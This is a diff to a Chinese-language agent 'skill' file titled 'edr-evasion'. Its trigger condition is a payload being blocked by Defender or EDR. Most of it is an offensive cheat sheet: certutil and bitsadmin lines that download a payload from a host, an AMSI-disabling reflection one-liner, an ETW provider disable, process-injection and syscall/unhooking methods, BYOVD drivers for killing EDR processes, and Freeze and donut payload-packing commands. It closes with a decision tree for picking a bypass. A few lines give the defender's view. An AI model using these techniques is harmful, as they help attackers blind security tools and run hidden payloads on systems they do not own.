@@ -1,7 +1,7 @@
 ---
 name: 'edr-evasion'
-description: 'EDR/AV 绕过 2026：LOTL→AMSI→ETW→进程注入→Direct Syscalls→BYOVD→内存加密。含工具和决策树。'
-disable-model-invocation: true
+description: 'EDR/AV 绕过 2026：LOTL→AMSI→ETW→进程注入→Direct Syscalls→BYOVD→内存加密。含工具和决策树。（检索词：edr/av/amsi/etw/byovd/syscall/injection/evasion/silencer/ringreaper/io_uring/wfp/driver/kernel）'
+whenToUse: '上传 payload 被 Defender/EDR 拦截时：LOTL→AMSI→ETW→进程注入→Direct Syscalls→BYOVD。'
 metadata: { domain: ad-win, tier: T2 }
 ---
 
@@ -9,9 +9,19 @@ metadata: { domain: ad-win, tier: T2 }
 
 > 🔴 **2026 年最活跃攻防领域。首选 LOTL，其次 Syscall，最后 BYOVD。**
 
+## 10. 快速决策树
+
+```
+有 PowerShell → AMSI Bypass → 无文件执行
+有代码执行 → LOTL (certutil/bitsadmin/msbuild)
+需要持久 beacon → Indirect Syscall + PPID Spoofing + 加密 + 进程注入
+EDR 太强 → BYOVD (RTCore64) 终止 EDR → 后续操作
+纯静默 → LOLBins 链 (每一步都用系统自带工具)
+```
+
 ## 0. 检测当前环境
 
-```text
+```
 # 杀软/EDR 检测
 tasklist | findstr /I "defender sentinel crowdstrike carbon cylance sophos trend mcafee symantec eset"
 Get-MpComputerStatus | Select-Object *enabled*   # Defender 状态
@@ -22,7 +32,7 @@ wmic /namespace:\\root\securitycenter2 path antivirusproduct get displayname
 
 # 确认绕过生效
 Write-Host "AMSI Test"
-```text
+```
 
 ---
 
@@ -30,7 +40,7 @@ Write-Host "AMSI Test"
 
 > CISA 2025 官方指南。用系统自带二进制，不落盘。
 
-```text
+```
 # 下载执行
 certutil -urlcache -split -f http://IP/payload.exe C:\Windows\Temp\p.exe
 bitsadmin /transfer job /download /priority high http://IP/payload C:\Windows\Temp\p.exe
@@ -55,20 +65,20 @@ wmic /node:IP /user:user /password:pass process call create "calc.exe"
 
 # .NET InstallUtil
 installutil /U C:\Windows\Temp\evil.dll  # 以 SYSTEM 执行 Uninstaller
-```text
+```
 
 ### LOLBins 完整列表参考
-```text
+```
 LOLBAS Project: https://lolbas-project.github.io/
 GTFOBins: https://gtfobins.github.io/ (Linux)
 LOOBins: https://www.loobins.io/ (macOS)
-```text
+```
 
 ---
 
 ## 2. AMSI 绕过
 
-```text
+```
 # PowerShell
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
@@ -80,13 +90,13 @@ powershell -version 2 -c "..."
 
 # 混淆
 "AMSI" → [char]65+[char]77+[char]83+[char]73
-```text
+```
 
 ---
 
 ## 3. ETW (Event Tracing for Windows) 绕过
 
-```text
+```
 # PowerShell
 $logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
 $etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
@@ -94,13 +104,13 @@ $etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue(
 
 # Patch EtwEventWrite 函数
 # → ntdll.dll!EtwEventWrite → 写 ret (0xC3)
-```text
+```
 
 ---
 
 ## 4. 进程注入
 
-```text
+```
 # 经典技术
 [ ] CreateRemoteThread            # 最老但最稳定
 [ ] Process Hollowing             # 挂起合法进程 → 替换内存 → 恢复
@@ -114,7 +124,7 @@ $etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue(
 # 注入目标选择
 白名单进程: notepad.exe / calc.exe / iexplore.exe / svchost.exe
 签名进程:   Microsoft Edge / Teams / OneDrive
-```text
+```
 
 ---
 
@@ -122,7 +132,7 @@ $etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue(
 
 > 绕过用户态 hook。EDR hook 在 ntdll.dll 层失效。2025+ EDR 已能检测 Direct → 演进到 Indirect。
 
-```text
+```
 # 原理
 正常:     program → ntdll.dll (HOOKED) → syscall → kernel
 Direct:   program → 直接 syscall → kernel  (syscall 来自 ntdll 外部 → ⚠️ 可检测)
@@ -142,12 +152,12 @@ Indirect: program → ntdll.dll (gadget) → syscall → kernel (syscall 地址�
 
 # optiv/Freeze → suspend process + direct syscalls + AES encryption
 Freeze -I shellcode.bin -encrypt -O evil.exe
-```text
+```
 
 ---
 
 ## 6.5 🆕 API Unhooking (重载干净 ntdll)
-```text
+```
 # 原理: EDR hook 存在于内存中的 ntdll.dll → 从磁盘读一份干净的 → 替换
 # 不同于 syscall 绕过 — 恢复整个 DLL 的原始 .text section
 
@@ -158,34 +168,34 @@ Freeze -I shellcode.bin -encrypt -O evil.exe
 #    → 之后所有 ntdll 调用都不再经过 EDR
 
 # 工具: RefleXXion / SharpUnhooker / 手工 NtMapViewOfSection
-```text
+```
 
 ### 🆕 硬件断点 (HWBP / Blindside)
-```text
+```
 # 利用 CPU 调试寄存器 (DR0-DR3) + DR7 设置硬件断点 — 内存本身零修改
 # VEH (Vectored Exception Handler) + HWBP → 单步异常 → 改 RIP / unhook
 # 绕过所有基于内存完整性扫描的检测 (无 hook、无 patch、无 .text 修改)
 # 🔴 Cymulate "Blindside" 技术: hook LdrLoadDll → 阻止 EDR DLL 加载 → 干净进程
 # 🔴 实战: 设 HWBP on NtOpenSection → VEH → 手工 map 恶意 PE → 执行
-```text
+```
 
 ---
 
 ## 7. DLL 侧加载 & 代理
 
-```text
+```
 # 模式: 签名 EXE → 加载恶意 DLL
 # 经典组合:
 MpCmdRun.exe + MpClient.dll         # Defender 自身 + 伪造 DLL
 OneDrive.exe + version.dll          # OneDrive 侧加载
 Teams.exe + wkscli.dll
-```text
+```
 
 ---
 
 ## 7. BYOVD (Bring Your Own Vulnerable Driver) 🔴 2026 年爆炸增长
 
-```text
+```
 # 原理: 加载签名但含漏洞的驱动 → 内核内存读写 → 终止 EDR 进程
 
 # 著名武器化驱动
@@ -202,13 +212,43 @@ Teams.exe + wkscli.dll
 [ ] Terminator    → BYOVD 一键杀 EDR
 
 # 防御侧: 启用 HVCI + Microsoft Vulnerable Driver Blocklist
-```text
+```
+
+### 🆕 7.1 2026 BYOVD 的三个变化（比驱动清单更重要）
+
+**① 内嵌进载荷，不再是独立前置步骤**
+Reynolds 勒索（2026-02）把有漏洞的 **NsecSoft `NSecKrnl`（CVE-2025-68947）直接内嵌进勒索载荷**，注册为服务后利用 → 一次性终止 **Avast / CrowdStrike Falcon / Cortex XDR / Sophos / Symantec**。
+→ **含义**：过去"先跑 EDR-killer 再投载荷"是两步、两次检测窗口；**现在只有一次**。
+→ 防守方要监控**服务注册 + 驱动加载**这个动作本身，而不是等 EDR 进程消失（那时已经太晚）。
+
+**② 规模化作**：Warlock 用 **GPO 域内批量部署** BYOVD 能力（Trend Micro 2026-03，内网停留 **15 天**）；TrueSight 单个战役用了 **2,500+ 驱动变体**。
+→ **含义**：驱动黑名单**不是有效防线**（变体基数太大，且每年新增），HVCI 才是。
+→ 红队视角：找一个**不在微软 blocklist 上**的签名驱动，仍然是最短路径。
+
+**③ 商品化**：2026 初俄语论坛挂牌 **"Artjkee" EDR+AV Killer Builder**（2025-12）、**"Baphomet" Advanced AV/EDR Kill Process**（2026-01-23）—— 专业品牌、商业级营销、**带源码**。
+→ **几千美元 + 零内核经验**即可获得完整 EDR 终止能力。
+
+### 🆕 7.2 两条非 BYOVD 的 2026 路线
+
+- **EDR Silencer（Windows）**：用 **Windows Filtering Platform (WFP)** 阻断 EDR 的**网络流量**。
+  → **关键区别**：EDR 进程**还活着、还能扫本地**，只是**上报不出去**。绕过的是"检测与响应"链路，不是进程本身。
+  → 防守检测点：EDR 与服务端**心跳/遥测中断**应单独告警，别只看进程存活。
+
+- **RingReaper（Linux）**：滥用 **`io_uring`** —— I/O 提交走内核异步路径，**对传统 Linux EDR 的 syscall 监控不可见**。
+  → Linux 侧 EDR 若不 hook io_uring，**大量文件/网络操作落在监控黑盒里**。
+
+**⚠️ Direct Syscall 已不够（2026 修订）**
+现代 EDR 不再只靠 ntdll hook，而是监控**异常 syscall 模式**：
+**非标准调用序列** / **来自非典型内存区域** / **与进程上下文不一致**。
+→ 单靠 direct syscall 会被这条**行为规则**抓住；要配合 §6.5 API Unhooking 或硬件断点路线。
+
+**🔴 数据背景（决定值不值得投入）**：CrowdStrike《2026 Global Threat Report》—— **82% 的检出是"无恶意软件"的**；涉及恶意软件的那 18%，越来越多是"**先干掉你的检测栈**"。
 
 ---
 
 ## 8. 内存加密 & 阶段性加载
 
-```text
+```
 # Lazy Loading
 - 磁盘上的 payload: XOR/RC4/AES 加密 → 静态查杀失效
 - 运行时解密 → 分配 RW 内存 → 解密 → 改 RX → 执行
@@ -221,13 +261,13 @@ Teams.exe + wkscli.dll
 # Sleep Obfuscation
 - Beacon sleep 时加密内存 + 堆栈欺骗
 - 防止内存扫描抓到 C2 payload
-```text
+```
 
 ---
 
 ## 9. 实用工具
 
-```text
+```
 # AV 检测触发点定位
 ThreatCheck.exe -f payload.exe      # 二分定位哪段字节触发 AV
 
@@ -241,20 +281,10 @@ Amsi-Killer.exe / PwnedPass.exe
 [ ] 打包:           PS2EXE / PyInstaller (但易被杀)
 
 # Donut → shellcode 转 .NET/JS/VBS/PowerShell
-donut -i original.exe -a 2 -o payload.bin
-```text
+donut -f exe -a 2 -o payload.bin original.exe
+```
 
 ---
-
-## 10. 快速决策树
-
-```text
-有 PowerShell → AMSI Bypass → 无文件执行
-有代码执行 → LOTL (certutil/bitsadmin/msbuild)
-需要持久 beacon → Indirect Syscall + PPID Spoofing + 加密 + 进程注入
-EDR 太强 → BYOVD (RTCore64) 终止 EDR → 后续操作
-纯静默 → LOLBins 链 (每一步都用系统自带工具)
-```text
 
 ## 反模式
 
